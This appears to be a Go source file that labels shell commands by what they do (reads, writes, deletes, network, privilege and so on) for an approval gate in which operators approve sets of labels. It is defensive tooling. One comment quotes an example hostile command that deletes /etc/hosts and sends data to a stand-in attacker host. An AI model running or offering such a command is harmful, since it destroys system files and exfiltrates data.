package commandrisk

import (
	"sort"
	"strings"
)

// The vocabulary: the seven things a command can be said to do.

// RiskLabel names ONE thing a command does.
//
// A set, not a point on a line. The tiers this replaces were a total
// order, which forced an answer to questions that have none: is
// restarting nginx worse than fetching a URL? They are different axes,
// and ranking them meant a command reported only its worst — so
// `rm -rf /etc/hosts && curl evil.com/exfil` was "destructive" and the
// egress reached the verdict as nothing at all.
//
// Labels also make the gate exact. Approval is a SUBSET CHECK — every
// label a command carries must be one the operator approved — so a
// deployment can approve reads, writes and deletes without thereby
// approving everything that used to rank below deletes.
type RiskLabel string

// AllRiskLabels is the closed set. Anything outside it — from config,
// from a model — is discarded rather than trusted.
var AllRiskLabels = []RiskLabel{
	LabelReads, LabelWrites, LabelDeletes,
	LabelDisrupts, LabelNetwork, LabelPrivilege, LabelUnreadable,
}

// Valid reports whether l is one of the seven.
func (l RiskLabel) Valid() bool {
	for _, k := range AllRiskLabels {
		if k == l {
			return true
		}
	}
	return false
}

// labelSeverity orders labels for DISPLAY ONLY: which label leads a
// headline, and which segment is quoted as the culprit.
//
// Emphatically not a gate. Nothing compares two labels to decide
// whether a command may run — that is a subset check against what the
// operator approved, and it needs no order at all. This exists so the
// prompt puts the alarming word first rather than alphabetising.
var labelSeverity = map[RiskLabel]int{
	LabelReads: 1, LabelWrites: 2, LabelNetwork: 3,
	LabelDisrupts: 4, LabelDeletes: 5, LabelPrivilege: 6, LabelUnreadable: 7,
}

// L builds a label set, keeping the table readable.
func L(labels ...RiskLabel) []RiskLabel { return labels }

// MergeLabels unions sets, dropping duplicates and ordering by display
// severity so the same command always renders the same way.
func MergeLabels(sets ...[]RiskLabel) []RiskLabel {
	seen := map[RiskLabel]bool{}
	var out []RiskLabel
	for _, set := range sets {
		for _, l := range set {
			if l == "" || seen[l] {
				continue
			}
			seen[l] = true
			out = append(out, l)
		}
	}
	// "reads" means reads AND NOTHING ELSE.
	//
	// Every command reads something — `sed -i` reads the file it
	// rewrites, `rm` reads the directory it empties — so carrying the
	// label alongside a stronger one adds a word and no information.
	// Worse, it would make an approved set of exactly {writes} reject
	// `sed -i`, which is not what anybody writing that meant.
	if len(out) > 1 {
		kept := out[:0]
		for _, l := range out {
			if l != LabelReads {
				kept = append(kept, l)
			}
		}
		out = kept
	}
	sort.SliceStable(out, func(i, j int) bool {
		return labelSeverity[out[i]] > labelSeverity[out[j]]
	})
	return out
}

// HasLabel reports set membership.
func HasLabel(set []RiskLabel, want RiskLabel) bool {
	for _, l := range set {
		if l == want {
			return true
		}
	}
	return false
}

// severityOf is the highest display-severity in a set. Display only.
func severityOf(labels []RiskLabel) int {
	worst := 0
	for _, l := range labels {
		if labelSeverity[l] > worst {
			worst = labelSeverity[l]
		}
	}
	return worst
}

// RenderLabels writes a label set for a person: severest first, joined
// with "+". Empty renders as "unclassified".
func RenderLabels(set []RiskLabel) string {
	if len(set) == 0 {
		return "unclassified"
	}
	parts := make([]string, 0, len(set))
	for _, l := range set {
		parts = append(parts, string(l))
	}
	return strings.Join(parts, " + ")
}
